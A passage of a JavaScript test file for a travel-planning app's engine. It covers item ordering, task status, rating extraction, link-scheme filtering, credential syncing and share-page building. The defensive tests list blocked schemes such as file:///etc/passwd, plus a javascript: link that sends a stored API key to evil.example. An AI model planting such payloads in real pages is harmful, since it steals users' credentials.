  assert.deepEqual(out, ['b', 'd', 'a', 'c']);
});

test('orderSectionItems lets a saved order win, with unknown ids keeping the tail', () => {
  const entries = [
    secEntry('mon', '2026-08-10'),
    secEntry('tue', '2026-08-11'),
    secEntry('fresh', '2026-08-09')
  ];
  const out = C.orderSectionItems(entries, ['tue', 'mon']).map((e) => e.it.id);
  assert.deepEqual(out, ['tue', 'mon', 'fresh']);
  // Stale ids in the saved order are ignored, not fatal: an item the traveler
  // archived weeks ago must not cost the section its arrangement.
  const out2 = C.orderSectionItems(entries, ['ghost', 'tue', 'ghost', 'mon']).map((e) => e.it.id);
  assert.deepEqual(out2, ['tue', 'mon', 'fresh']);
});

test('orderSectionItems sinks done items even when a drag put one on top', () => {
  const out = C.orderSectionItems([
    secEntry('a', '2026-08-10', null, 'done'),
    secEntry('b', '2026-08-11')
  ], ['a', 'b']).map((e) => e.it.id);
  assert.deepEqual(out, ['b', 'a']);
});

test('setSectionItemOrder cleans ids and drops the key when nothing is left', () => {
  const st = C.normalizeState({});
  C.setSectionItemOrder(st, 'dinner', ['a', 'b', 'a', '', null, 'c']);
  assert.deepEqual(st.sectionItemOrder.dinner, ['a', 'b', 'c']);
  assert.deepEqual(C.sectionItemOrderFor(st, 'dinner'), ['a', 'b', 'c']);
  C.setSectionItemOrder(st, 'dinner', []);
  assert.equal(Object.prototype.hasOwnProperty.call(st.sectionItemOrder, 'dinner'), false);
  assert.deepEqual(C.sectionItemOrderFor(st, 'dinner'), []);
  assert.throws(() => C.setSectionItemOrder(st, '', ['a']));
});

test('a state written before section order existed normalizes to no arrangement', () => {
  const st = C.normalizeState({ itemStatus: {} });
  assert.deepEqual(st.sectionItemOrder, {});
  assert.deepEqual(C.sectionItemOrderFor(st, 'anything'), []);
});

test('dayItemOrder and sectionItemOrder are separate key spaces, not one map', () => {
  const st = C.normalizeState({});
  C.setDayItemOrder(st, '2026-08-10', ['x', 'y']);
  C.setSectionItemOrder(st, 'dinner', ['y', 'x']);
  assert.deepEqual(st.dayItemOrder['2026-08-10'], ['x', 'y']);
  assert.deepEqual(st.sectionItemOrder.dinner, ['y', 'x']);
});

// ---- Plan tab tasks: done, open, and declined ----
// Declining a task writes the EXISTING archived status; the Plan tab is the
// one surface that reads archived task items back out.
const TASKY = {
  schema: 1,
  city: { name: 'Tirana', country: 'AL',
    dates: { from: '2026-08-22', to: '2026-08-25' },
    accommodation: { name: 'Stay', lat: 41.3, lng: 19.8 } },
  sections: [
    { id: 'tasks', label: 'Tasks', icon: '✅' },
    { id: 'dinner', label: 'Dinner', icon: '🍽️' }
  ],
  items: [
    { id: 't-open', section: 'tasks', status: 'plan', name: 'Book the barber', links: [] },
    { id: 't-done', section: 'tasks', status: 'done', name: 'Buy a SIM', links: [] },
    { id: 't-no', section: 'tasks', status: 'archived', name: 'Day trip to Kruje', links: [] },
    { id: 'd1', section: 'dinner', status: 'plan', day: '2026-08-23', name: 'Somewhere', links: [] }
  ]
};

test('planModel splits tasks three ways: open, done and declined', () => {
  const pm = C.planModel(clone(TASKY), C.normalizeState({}), '2026-08-22');
  assert.deepEqual(pm.openTasks.map((e) => e.it.id), ['t-open']);
  assert.deepEqual(pm.doneTasks.map((e) => e.it.id), ['t-done']);
  assert.deepEqual(pm.declinedTasks.map((e) => e.it.id), ['t-no']);
  assert.equal(pm.declinedTasks[0].status, 'archived');
});

test('declining a task moves it out of open and into declined, and restoring reverses it', () => {
  const data = clone(TASKY);
  const st = C.normalizeState({});
  C.setStatus(st, 't-open', 'archived');
  let pm = C.planModel(data, st, '2026-08-22');
  assert.deepEqual(pm.openTasks.map((e) => e.it.id), []);
  assert.deepEqual(pm.declinedTasks.map((e) => e.it.id).sort(), ['t-no', 't-open']);
  // Every state is reachable from every other: back to open, then to done.
  C.setStatus(st, 't-open', 'plan');
  pm = C.planModel(data, st, '2026-08-22');
  assert.deepEqual(pm.openTasks.map((e) => e.it.id), ['t-open']);
  assert.deepEqual(pm.declinedTasks.map((e) => e.it.id), ['t-no']);
  C.setStatus(st, 't-open', 'done');
  pm = C.planModel(data, st, '2026-08-22');
  assert.deepEqual(pm.doneTasks.map((e) => e.it.id).sort(), ['t-done', 't-open']);
});

test('declining does not invent a status: archived is the only value written', () => {
  const st = C.normalizeState({});
  C.setStatus(st, 't-open', 'archived');
  assert.equal(st.itemStatus['t-open'], 'archived');
  assert.throws(() => C.setStatus(st, 't-open', 'declined'));
});

test('a declined task that carries a day still surfaces, so it is never a dead end', () => {
  const data = clone(TASKY);
  const st = C.normalizeState({});
  C.setDay(st, 't-open', '2026-08-23');
  C.setStatus(st, 't-open', 'archived');
  const pm = C.planModel(data, st, '2026-08-22');
  assert.deepEqual(pm.declinedTasks.map((e) => e.it.id).sort(), ['t-no', 't-open']);
  // And it is not also sitting in the day group it used to be in.
  const wed = pm.days.filter((d) => d.iso === '2026-08-23')[0];
  assert.equal(wed.items.filter((e) => e.it.id === 't-open').length, 0);
});

test('declined tasks come only from task sections, never from a dinner list', () => {
  const data = clone(TASKY);
  const st = C.normalizeState({});
  C.setStatus(st, 'd1', 'archived');
  const pm = C.planModel(data, st, '2026-08-22');
  assert.deepEqual(pm.declinedTasks.map((e) => e.it.id), ['t-no']);
});

test('buildRatingsPassPrompt echoes existing intel so a takeaway cannot delete it', () => {
  const city = clone(GOOD);
  city.items[0].intel = {
    verdicts: [{ tier: 'must', text: 'The duck is the reason to come' }],
    tips: ['Ask for the terrace'],
    source: 'Google Maps reviews, Jul 2026'
  };
  const out = C.promptKit.buildRatingsPassPrompt(FAKE_RERUN, city);
  assert.ok(out.includes('- brasserie | dinner | Brasserie 1900'));
  assert.ok(out.includes('    existing verdict (must): The duck is the reason to come'));
  assert.ok(out.includes('    existing tip: Ask for the terrace'));
  assert.ok(out.includes('    existing intel source: Google Maps reviews, Jul 2026'));
  // An item with no intel costs no extra lines at all.
  assert.equal(out.indexOf('- tanini | dinner | Tanini\n    existing'), -1);
  assert.ok(out.includes('Indented lines under an item are the intel it already holds'));
});

test('the real PROMPT.md ratings pass asks for at most one notable review takeaway', () => {
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const out = C.promptKit.buildRatingsPassPrompt(prompt, GOOD);
  assert.ok(out.includes('At most one per item, and only when it would change a decision.'));
  assert.ok(out.includes('`intel` REPLACES an item\'s whole existing intel block.'));
  assert.ok(out.includes('"intel": {'));
  // The takeaway rides the existing intel map, so mergeDelta needs no new
  // machinery: the shape the contract shows must be one mergeDelta accepts.
  const r = C.mergeDelta(clone(GOOD), {
    schema: 1, delta: true,
    ratings: { brasserie: { stars: 4.7, checked: '2026-08-25' } },
    intel: { nord: { tips: ['Reviewers say the terrace is the quiet half.'],
      source: 'Google Maps reviews, Aug 2026' } }
  });
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.ratingsApplied, 1);
  assert.equal(r.summary.intelApplied, 1);
  assert.equal(r.data.items[3].intel.tips[0], 'Reviewers say the terrace is the quiet half.');
});

// ---- tools/extract-ratings.js: prose to structured data ----
// Every case below is a note shape observed in real generated guides
// (venue names and addresses replaced with neutral stand-ins).
test('extractRating reads every rating shape the shipped guides actually use', () => {
  const { extractRating } = require('../tools/extract-ratings');
  function r(note) { return extractRating(note).rating; }
  assert.deepEqual(r('4.8 stars across 442 reviews, the highest-rated place nearby.'),
    { stars: 4.8, count: 442, source: 'from generation research' });
  assert.equal(r('4.5 stars, 252 reviews. Air conditioning.').count, 252);
  assert.equal(r('4.6★ across 5,545 reviews - the broadest menu.').count, 5545);
  assert.equal(r('Example Street 25 · 4.9★ (38).').count, 38);
  assert.equal(r('Dropped, 3.6★ on only 7 reviews.').count, 7);
  assert.equal(r('4.9 stars but only 76 reviews, so treat that as soft.').count, 76);
  assert.equal(r('4.5 stars across roughly 1,000 reviews.').count, 1000);
  assert.equal(r('4.5 stars across about 405 reviews.').count, 405);
  assert.equal(r('4.6 stars across 250 ratings.').count, 250);
  assert.equal(r('4.5 stars and 1,833 reviews for the park, 4.6 and 607 for the statue.').count, 1833);
  // The FIRST rating wins when a note compares two sources or two branches.
  assert.deepEqual(r('4.5 stars across 370 Google reviews and 4.9 across 177 Yandex ratings.'),
    { stars: 4.5, count: 370, source: 'from generation research' });
  // Stars with no count at all: the count key is simply absent.
  assert.deepEqual(r('Drop-off dry cleaning. 4.5 stars. Opens 09:00.'),
    { stars: 4.5, source: 'from generation research' });
  assert.deepEqual(r("Was Plan A in v1; it's 4.2★ and has become a tourist cafe."),
    { stars: 4.2, source: 'from generation research' });
});

test('extractRating never guesses an ambiguous reading', () => {
  const { extractRating } = require('../tools/extract-ratings');
  // A star RANGE gives no rating at all: picking one end invents precision.
  assert.equal(extractRating('About 4.5 to 4.6 stars across roughly 140 Google reviews.').rating, null);
  // A count range gives the stars and drops the count.
  assert.deepEqual(extractRating('5.0 stars across roughly 230 to 250 reviews, the best nearby.').rating,
    { stars: 5, source: 'from generation research' });
  // Nothing rating-shaped in the note, and no note at all.
  assert.equal(extractRating('Opens 08:00, runs to 02:00. 40 Pushkin.').rating, null);
  assert.equal(extractRating('').rating, null);
  assert.equal(extractRating(undefined).rating, null);
  assert.equal(extractRating(null).rating, null);
});

test('extractRating only edits the note when the clause is a whole sentence', () => {
  const { extractRating } = require('../tools/extract-ratings');
  // Whole sentence, first: it goes, and the note starts at the real content.
  const lead = extractRating('4.7 stars across 801 reviews. Armenian crossed with Lebanese.');
  assert.equal(lead.removed, true);
  assert.equal(lead.note, 'Armenian crossed with Lebanese.');
  // Whole sentence, in the middle: the sentences either side close up.
  const mid = extractRating('Drop-off dry cleaning, returned folded. 4.5 stars. Opens 09:00.');
  assert.equal(mid.removed, true);
  assert.equal(mid.note, 'Drop-off dry cleaning, returned folded. Opens 09:00.');
  // The sentence says something else too: not one character is touched.
  const rich = '4.8 stars across 442 reviews, the highest-rated substantial restaurant nearby.';
  const kept = extractRating(rich);
  assert.equal(kept.removed, false);
  assert.equal(kept.note, rich);
  assert.equal(kept.rating.stars, 4.8);
  // Mid-sentence clause, same rule: rating extracted, prose left alone.
  const inline = 'A real self-service laundromat, open 24 hours, 5.0 stars. The wash caps at an hour.';
  assert.equal(extractRating(inline).removed, false);
  assert.equal(extractRating(inline).note, inline);
  // A note that was ONLY the rating leaves no empty string behind.
  const only = extractRating('4.5 stars.');
  assert.equal(only.removed, true);
  assert.equal(only.note, null);
});

test('splitSentences round-trips byte for byte, decimals and all', () => {
  const { splitSentences } = require('../tools/extract-ratings');
  const notes = [
    '4.7 stars across 801 reviews. Armenian crossed with Lebanese and Syrian. 16 min walk.',
    'Opens 08:00 and runs to 02:00. 4.6 stars across 479 Google reviews, but Tripadvisor sits at 3.4.',
    'No terminator at the end',
    'Two branches, Hanrapetutyan 2nd Lane 17/1 and Mashtots 5/9. Carry both!'
  ];
  notes.forEach((n) => { assert.equal(splitSentences(n).join(''), n); });
  assert.equal(splitSentences('4.7 stars across 801 reviews. Armenian food.').length, 2);
});

// ---- link scheme allowlist ----

test('safeHref allows the schemes a travel link legitimately uses', () => {
  const ok = [
    'https://maps.google.com/?cid=895365817124148954',
    'http://example.com/place',
    'HTTPS://EXAMPLE.COM',
    'tel:+15555123456',
    'mailto:hello@example.com',
    'geo:41.64,41.61',
    '/relative/path',
    'relative/path?q=1',
    '#anchor',
    'place/x:1',                 // colon inside a path, not a scheme
    '//cdn.example.com/x'        // scheme-relative: inherits http(s) here
  ];
  ok.forEach((h) => assert.equal(C.safeHref(h), h, 'should allow ' + h));
});

test('safeHref refuses every scheme that can execute or smuggle content', () => {
  const bad = [
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    '  javascript:alert(1)  ',       // leading space is trimmed before parsing
    'java\tscript:alert(1)',         // browsers ignore control chars in a scheme
    'java\nscript:alert(1)',
    'jav ascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD4=',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    'blob:https://example.com/abc',
    '',
    '   ',
    null,
    undefined,
    42
  ];
  bad.forEach((h) => assert.equal(C.safeHref(h), null, 'should refuse ' + String(h)));
});

test('a hostile link in guide JSON validates but never goes live in the DOM', () => {
  // The guide is untrusted input: it is pasted from an AI, imported from a
  // file, or pulled from a sync row. This is the whole point of the
  // allowlist, so it is asserted on a city that is otherwise perfectly valid.
  const hostile = JSON.parse(JSON.stringify(GOOD));
  hostile.items[0].links = [
    { kind: 'web', label: 'Book a table', href: 'javascript:fetch("https://evil.example/"+localStorage.getItem("cityops.claude.apikey.v1"))' },
    { kind: 'map', label: 'Open in Maps', href: 'https://maps.google.com/?cid=1' }
  ];
  assert.deepEqual(C.validate(hostile), []);          // the validator still accepts it
  assert.equal(C.safeHref(hostile.items[0].links[0].href), null);   // the renderer will not
  assert.equal(C.safeHref(hostile.items[0].links[1].href), 'https://maps.google.com/?cid=1');
});

// ---- profile row: the Claude key and form metadata as stamped sidecars ----

const P_LOCAL = '2026-08-20T10:00:00.000Z';
const P_REMOTE = '2026-08-21T10:00:00.000Z';

test('buildProfileRow carries the key beside the profile, never inside it', () => {
  const row = C.syncKit.buildProfileRow(
    { interests: ['coffee'], updated: P_LOCAL },
    { apiKey: { value: 'sk-ant-secret', updated: P_REMOTE } });
  assert.equal(row.data.apiKey.value, 'sk-ant-secret');
  assert.equal(row.data.apiKey.updated, P_REMOTE);
  assert.deepEqual(row.data.interests, ['coffee']);
  // The ROW stamp stays the profile's own: a key change must not let an
  // otherwise stale profile win a reconcile it would lose on its merits.
  assert.equal(row.updated_at, P_LOCAL);
});

test('a profile with no stamp and no sidecars still builds a row at the epoch', () => {
  const row = C.syncKit.buildProfileRow(null, null);
  assert.equal(row.updated_at, C.syncKit.EPOCH);
  assert.equal(row.data.updated, null);
  assert.equal(row.data.apiKey, undefined);   // absent, never an empty block
  assert.equal(row.data.genmeta, undefined);
});

test('a sidecar with no stamp is treated as absent, not as an empty value', () => {
  // A block with no stamp cannot be reconciled against anything, so writing
  // it would silently beat a real one on the next pull.
  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL },
    { apiKey: { value: 'sk-ant-x' }, genmeta: { value: { a: { notes: 'x' } } } });
  assert.equal(row.data.apiKey, undefined);
  assert.equal(row.data.genmeta, undefined);
});

test('the Claude key cannot survive a round trip into the interest profile', () => {
  // This is the guarantee the whole design rests on: normalizeProfile rebuilds
  // from a fixed field list, so a pulled row's sidecars can never reach
  // store.profile, and from there a prompt, an export or a city row.
  const row = C.syncKit.buildProfileRow({ interests: ['ramen'], updated: P_LOCAL },
    { apiKey: { value: 'sk-ant-secret', updated: P_LOCAL },
      genmeta: { value: { 'batumi-2026-08-08': { notes: 'top floor' } }, updated: P_LOCAL } });
  const back = C.profile.normalize(row.data);
  assert.equal(back.apiKey, undefined);
  assert.equal(back.genmeta, undefined);
  assert.deepEqual(Object.keys(back).sort(),
    ['avoid', 'factors', 'interests', 'notes', 'schema', 'showExample', 'updated']);
  // And the prompt built from that profile carries no trace of either.
  const prompt = C.promptKit.buildInterestsDeltaPrompt(FAKE_RERUN, GOOD, back);
  assert.equal(prompt.indexOf('sk-ant-secret'), -1);
  assert.equal(prompt.indexOf('top floor'), -1);
});

test('an exported guide carries no sidecar, because the export never sees one', () => {
  const out = C.buildExport(GOOD, C.emptyState());
  assert.equal(JSON.stringify(out).indexOf('apiKey'), -1);
  assert.equal(JSON.stringify(out).indexOf('sk-ant'), -1);
});

// ---- the GitHub token sidecar (the trip surface's publish credential) ----

// ---- the retired GitHub PAT sidecar (Phase B migration) ----
// The token used to ride the profile row beside the Claude key. The publish
// path it existed for is gone, so buildProfileRow stopped writing it and every
// push from here on is the migration: one rewrite, and the token is off the
// account. These three tests are the whole contract.
test('buildProfileRow never writes the retired GitHub sidecar again', () => {
  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL }, {
    apiKey: { value: 'sk-ant-x', updated: P_LOCAL },
    github: { value: 'github_pat_secret', updated: P_REMOTE }
  });
  assert.equal(row.data.github, undefined, 'the token is back in the profile row');
  assert.equal(JSON.stringify(row).indexOf('github_pat_secret'), -1);
  // The Claude key is untouched, and the row's own stamp is still the
  // PROFILE's: this migration must not make a stale profile win a reconcile.
  assert.deepEqual(row.data.apiKey, { value: 'sk-ant-x', updated: P_LOCAL });
  assert.equal(row.updated_at, P_LOCAL);
});

test('a row that still carries the GitHub sidecar is a row owing a push', () => {
  // This is what makes the migration happen by itself: the next pull sees the
  // legacy field, says a push is worth making, and mergeProfileRow writes the
  // row back without it.
  const legacy = {
    data: { updated: P_REMOTE, apiKey: { value: 'sk', updated: P_REMOTE },
            github: { value: 'github_pat_secret', updated: P_REMOTE } },
    updated_at: P_REMOTE
  };
  assert.equal(C.syncKit.legacyGithubSidecar(legacy.data), true);
  assert.equal(C.syncKit.legacyGithubSidecar({ apiKey: { value: 'sk', updated: P_REMOTE } }), false);
  // Nothing on this device is newer, and it still owes a push.
  assert.equal(C.syncKit.sidecarsWorthPushing(legacy, { apiKey: { value: 'sk', updated: P_REMOTE } }), true);
  const cleaned = C.syncKit.mergeProfileRow(legacy, { apiKey: { value: 'sk', updated: P_REMOTE } });
  assert.equal(cleaned.data.github, undefined, 'the cleanup push carried the token back up');
  assert.equal(JSON.stringify(cleaned).indexOf('github_pat_secret'), -1);
  // And once it is gone, the row stops asking to be rewritten.
  assert.equal(C.syncKit.sidecarsWorthPushing({ data: cleaned.data, updated_at: P_REMOTE },
    { apiKey: { value: 'sk', updated: P_REMOTE } }), false);
});

test('a GitHub token cannot reach the interest profile, a prompt or an export', () => {
  const row = C.syncKit.buildProfileRow({ interests: ['ramen'], updated: P_LOCAL },
    { github: { value: 'github_pat_secret', updated: P_LOCAL } });
  const back = C.profile.normalize(row.data);
  assert.equal(back.github, undefined);
  assert.deepEqual(Object.keys(back).sort(),
    ['avoid', 'factors', 'interests', 'notes', 'schema', 'showExample', 'updated']);
  assert.equal(C.promptKit.buildInterestsDeltaPrompt(FAKE_RERUN, GOOD, back)
    .indexOf('github_pat_secret'), -1);
});

test('an unstamped GitHub token is absent, exactly like an unstamped key', () => {
  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL }, { github: { value: 'github_pat_x' } });
  assert.equal(row.data.github, undefined);
});

// ---- mergeProfileRow: the trip surface pushes credentials, never a profile ----

test('mergeProfileRow keeps the account profile and its stamp untouched', () => {
  // The trip surface has no Profile UI, so it has no opinion about interests.
  // A PostgREST upsert replaces the whole row, so "no opinion" must mean
  // "write back exactly what was there", not "write a blank".
  const row = {
    data: { schema: 1, interests: ['ramen', 'ruins'], avoid: ['clubs'], factors: [],
            notes: 'quiet mornings', showExample: false, updated: P_REMOTE },
    updated_at: P_REMOTE
  };
  const out = C.syncKit.mergeProfileRow(row, { apiKey: { value: 'sk-new', updated: P_LOCAL } });
  assert.deepEqual(out.data.interests, ['ramen', 'ruins']);
  assert.deepEqual(out.data.avoid, ['clubs']);
  assert.equal(out.data.notes, 'quiet mornings');
  assert.equal(out.data.updated, P_REMOTE);
  assert.equal(out.updated_at, P_REMOTE);
  assert.deepEqual(out.data.apiKey, { value: 'sk-new', updated: P_LOCAL });
});

test('mergeProfileRow carries forward every sidecar it was not given', () => {
  // The trip surface knows nothing about genmeta. Dropping it would delete the
  // account's Add/Edit form metadata on the first credential push.
  const row = {
    data: {
      schema: 1, interests: [], avoid: [], factors: [], notes: '', showExample: false, updated: P_REMOTE,
      apiKey: { value: 'sk-ant-account', updated: P_REMOTE },
      genmeta: { value: { 'batumi-2026-08-08': { notes: 'top floor' } }, updated: P_REMOTE }
    },
    updated_at: P_REMOTE
  };
  const out = C.syncKit.mergeProfileRow(row, {});
  assert.deepEqual(out.data.apiKey, { value: 'sk-ant-account', updated: P_REMOTE });
  assert.deepEqual(out.data.genmeta.value, { 'batumi-2026-08-08': { notes: 'top floor' } });
});

test('mergeProfileRow is newest-wins per credential, both directions', () => {
  const row = {
    data: { updated: P_REMOTE, apiKey: { value: 'sk-account-newer', updated: P_REMOTE } },
    updated_at: P_REMOTE
  };
  // P_LOCAL is older than P_REMOTE, so the account's key survives...
  const older = C.syncKit.mergeProfileRow(row, { apiKey: { value: 'sk-device-older', updated: P_LOCAL } });
  assert.equal(older.data.apiKey.value, 'sk-account-newer');
  // ...and a genuinely newer device key replaces it.
  const newer = C.syncKit.mergeProfileRow(row, { apiKey: { value: 'sk-device-newer', updated: '2030-01-01T00:00:00.000Z' } });
  assert.equal(newer.data.apiKey.value, 'sk-device-newer');
});

test('mergeProfileRow against no row at all still writes the credential', () => {
  const out = C.syncKit.mergeProfileRow(null, { apiKey: { value: 'sk-first', updated: P_LOCAL } });
  assert.deepEqual(out.data.apiKey, { value: 'sk-first', updated: P_LOCAL });
  assert.deepEqual(out.data.interests, []);
  assert.equal(out.updated_at, C.syncKit.EPOCH);   // no profile edit is being claimed
});

test('sidecarsWorthPushing says no when the account already has it all', () => {
  const row = {
    data: { updated: P_REMOTE, apiKey: { value: 'sk', updated: P_REMOTE } },
    updated_at: P_REMOTE
  };
  assert.equal(C.syncKit.sidecarsWorthPushing(row, {
    apiKey: { value: 'sk', updated: P_REMOTE }
  }), false);
  // A device with nothing never pushes emptiness over a real credential.
  assert.equal(C.syncKit.sidecarsWorthPushing(row, { apiKey: null }), false);
  // A newer one does.
  assert.equal(C.syncKit.sidecarsWorthPushing(row, {
    apiKey: { value: 'sk2', updated: '2030-01-01T00:00:00.000Z' }
  }), true);
  // And so does a credential the account has never seen: this is the case that
  // carries a key out of the old trip blob and up to the account.
  assert.equal(C.syncKit.sidecarsWorthPushing(null, {
    apiKey: { value: 'sk', updated: C.syncKit.EPOCH }
  }), true);
});

// ---- the trip surface's credential migration ----
// stripCredentialsFromBlob lives in src/trip-shell.html (it needs localStorage),
// so what is pinned here is the shape contract it enforces: whatever the trip
// blob is, the credential fields are not in it, and the built page never
// mentions them as state.
test('the built trip page keeps no credential in its trip state shape', () => {
  const fs = require('fs');
  const path = require('path');
  const trip = fs.readFileSync(path.join(__dirname, '..', 'trip', 'index.html'), 'utf8');
  // defaultState() is the whole contract: a field that is not there cannot be
  // rehydrated by Object.assign from a pulled or imported blob.
  const def = trip.match(/function defaultState\(\) \{[\s\S]*?\n\}/);
  assert.ok(def, 'defaultState missing from the built trip page');
  assert.ok(!/\bapiKey\s*:/.test(def[0]), 'apiKey is back in the trip state');
  assert.ok(!/\bgithubToken\s*:/.test(def[0]), 'githubToken is back in the trip state');
  // Nothing anywhere reads a credential off `state` any more.
  assert.equal(trip.indexOf('state.apiKey'), -1);
  assert.equal(trip.indexOf('state.githubToken'), -1);
  // The migration runs on load, on pull, on restore and on import: all four
  // doors a blob can come through.
  assert.ok(trip.indexOf('stripCredentialsFromBlob') !== -1);
  assert.ok((trip.match(/stripCredentialsFromBlob\(/g) || []).length >= 5);
});

test('the built trip page reads the shared session key, not its own', () => {
  const fs = require('fs');
  const path = require('path');
  const trip = fs.readFileSync(path.join(__dirname, '..', 'trip', 'index.html'), 'utf8');
  assert.ok(/const AUTH_KEY = 'cityops\.auth\.v1'/.test(trip),
    'the trip surface must share the city app session key');
  // And it carries no sign-in flow of its own: one GoTrue redirect URL.
  assert.equal(trip.indexOf('/auth/v1/otp'), -1, 'the trip surface must not send magic links');
});

test('the published share is built from a fixed field list, in the engine', () => {
  // The share page is public. Its payload is built by naming the fields that
  // go into it (CityOps.shareKit.build, pure and tested below), never by
  // filtering a copy of the state, which is why no credential can reach it
  // even if one somehow got back into the blob.
  const fs = require('fs');
  const path = require('path');
  const trip = fs.readFileSync(path.join(__dirname, '..', 'trip', 'index.html'), 'utf8');
  const fn = trip.match(/function buildShareSnapshot\(row\) \{[\s\S]*?\n\}/);
  assert.ok(fn, 'buildShareSnapshot missing from the built trip page');
  assert.equal(fn[0].indexOf('apiKey'), -1);
  assert.equal(fn[0].indexOf('credGet'), -1);
  assert.ok(/CityOps\.shareKit\.build\(/.test(fn[0]), 'the snapshot must come from the engine');
  assert.ok(/travelerName:/.test(fn[0]) && /cities: state\.cities/.test(fn[0]) &&
    /transitions: state\.transitions/.test(fn[0]));
  // Both the download and the publish go through that one builder. Two
  // builders would be two field lists, and the second would drift.
  assert.ok(/return buildFamilyShareHTML\(buildShareSnapshot\(\)\)/.test(trip));
  assert.ok(/insertShareRow\(token, snapshot\) : patchShareRow\(row\.token, snapshot\)/.test(trip));
  // "Hide where I am staying" is passed to the ENGINE, which is where the
  // exclusion happens. A share page that filtered at render time would already
  // have shipped the address. It comes off the ROW now, so two links can
  // disagree about it.
  assert.ok(/hideLodging: !!r\.hideLodging/.test(fn[0]),
    'the lodging option must reach the engine builder, per link');
  assert.ok(/const r = row \|\| shareRows\(\)\[0\]/.test(fn[0]),
    'the builder must take the link whose snapshot it is building');
});

test('the lodging option rides the synced trip blob, per link', () => {
  // It has to persist where the picker persists, or an Update publish from
  // another device silently re-exposes the lodging this one hid.
  const fs = require('fs');
  const path = require('path');
  const trip = fs.readFileSync(path.join(__dirname, '..', 'trip', 'index.html'), 'utf8');
  const def = trip.match(/function defaultState\(\) \{[\s\S]*?\n\}/);
  assert.ok(def, 'defaultState missing from the built trip page');
  assert.ok(/\n    shares: \[\],/.test(def[0]), 'the share list must live in the trip blob');
  // The single-share fields stay for one release, so a device on the previous
  // build keeps reading a working link out of the same blob.
  assert.ok(/shareGuideIds: \[\],/.test(def[0]) && /shareHideLodging: false,/.test(def[0]) &&
    /shareToken: '',/.test(def[0]),
    'the legacy single-share fields must survive one release for older devices');
  assert.ok(/function mirrorLegacyShareFields\(\)/.test(trip) &&
    /mirrorLegacyShareFields\(\);/.test(trip),
    'every save must keep the legacy fields truthful');
  // Off by default, so nobody's existing family share loses the flat name on
  // the next publish without being asked, and it writes through saveState,
  // which is what syncs it. Per row, so two links can disagree.
  assert.ok(/function setShareHideLodging\(id, on\) \{[\s\S]{0,120}?updateShareRow\(id, \{ hideLodging: !!on \}\);/.test(trip),
    'the toggle must write one row through updateShareRow');
  assert.ok(/function updateShareRow\(id, patch, redraw\) \{[\s\S]*?saveState\(\);/.test(trip),
    'a row write must go through saveState, which is what syncs it');
  // The control exists, is a checkbox, and redraws from the row it belongs to.
  assert.ok(/hideBox\.id = 'share-hide-lodging-' \+ row\.id;/.test(trip));
  assert.ok(/hideBox\.checked = !!row\.hideLodging;/.test(trip));
  assert.ok(/setShareHideLodging\(row\.id, hideBox\.checked\)/.test(trip));
  // And the confirm names which way it is set, so Publish is never a surprise.
  assert.ok(/where you are staying is HIDDEN/.test(trip));
  assert.ok(/where you are staying is SHOWN/.test(trip));
});

test('the share page renders a hidden stay with no empty row and no undefined', () => {
  // The page's stay row, pulled out of the built share/index.html and run
  // against exactly what the builder emits for a hidden stay.
  const fs = require('fs');
  const path = require('path');
  const html = fs.readFileSync(path.join(__dirname, '..', 'share', 'index.html'), 'utf8');
  const start = html.indexOf('function buildStayRow(');
  assert.ok(start !== -1, 'buildStayRow is missing from the built share page');
  const end = html.indexOf('\n}\n', start);
  const row = new Function(
    'escapeHTML, fmtDate, isCurrentAccommodation',
    html.slice(start, end + 2) + '\nreturn buildStayRow;'
  )(s => String(s), d => 'D:' + d, () => false);

  const hidden = C.shareKit.stay(
    { name: 'Villa Kryptonite', city: 'Batumi', neighborhood: 'Old Town',
      link: 'https://booking.example/x', status: 'booked',
      checkIn: '2026-08-08', checkOut: '2026-08-15' }, true);
  const out = row(hidden, false);
  assert.equal(out.indexOf('Villa Kryptonite'), -1);
  assert.equal(out.indexOf('Old Town'), -1);
  assert.equal(out.indexOf('booking.example'), -1);
  assert.equal(out.indexOf('undefined'), -1, 'a missing field rendered as undefined');
  assert.ok(out.indexOf('Batumi') !== -1 && out.indexOf('D:2026-08-08') !== -1,
    'the city and the dates are what make the route legible, and must survive');
  // No dangling separator and no empty label row.
  assert.equal(/·\s*<\/div>/.test(out), false, 'a dangling middle dot survived');
  assert.equal(out.indexOf('<div class="accom-meta"></div>'), -1, 'an empty meta row was drawn');
  assert.equal(out.indexOf('<div class="accom-name"></div>'), -1, 'an empty name row was drawn');

  // A hidden stay with a date but no city still reads, and vice versa.
  const dateOnly = row({ hidden: true, city: '', checkIn: '2026-08-08', checkOut: '2026-08-15' }, false);
  assert.equal(dateOnly.indexOf('undefined'), -1);
  assert.ok(dateOnly.indexOf('D:2026-08-08') !== -1);
  assert.equal(/·\s*<\/div>/.test(dateOnly), false);
  const cityOnly = row({ hidden: true, city: 'Batumi', checkIn: '', checkOut: '' }, false);
  assert.equal(cityOnly.indexOf('undefined'), -1);
  assert.equal(/·\s*<\/div>/.test(cityOnly), false);

  // With the option off the row is the full one it has always been.
  const shown = C.shareKit.stay(
    { name: 'Sea View Flat', city: 'Batumi', neighborhood: 'Old Town',
      link: 'https://booking.example/x', status: 'booked',
      checkIn: '2026-08-08', checkOut: '2026-08-15' }, false);
  const full = row(shown, false);
  assert.ok(full.indexOf('Sea View Flat') !== -1);
  assert.ok(full.indexOf('Old Town') !== -1);
  assert.ok(full.indexOf('booking.example') !== -1);
});

test('the built trip page is the engine plus the shell, and nothing else', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const engine = fs.readFileSync(path.join(root, 'src', 'cityops.js'), 'utf8');
  const trip = fs.readFileSync(path.join(root, 'trip', 'index.html'), 'utf8');
  assert.ok(trip.includes(engine), 'run node tools/assemble.js after editing src/');
  // The seam links are same-origin: a cross-domain hop here would put the two
  // halves back on two origins and split the session again.
  // Root-absolute and EMPTY, not '.': every use appends '/', and from /trip/ a
  // '.' base would resolve the guide doors back onto this same page.
  assert.ok(/const CITYOPS_BASE = '';/.test(trip));
  assert.equal(trip.indexOf('https://app.nomadding.com/#city='), -1);
});

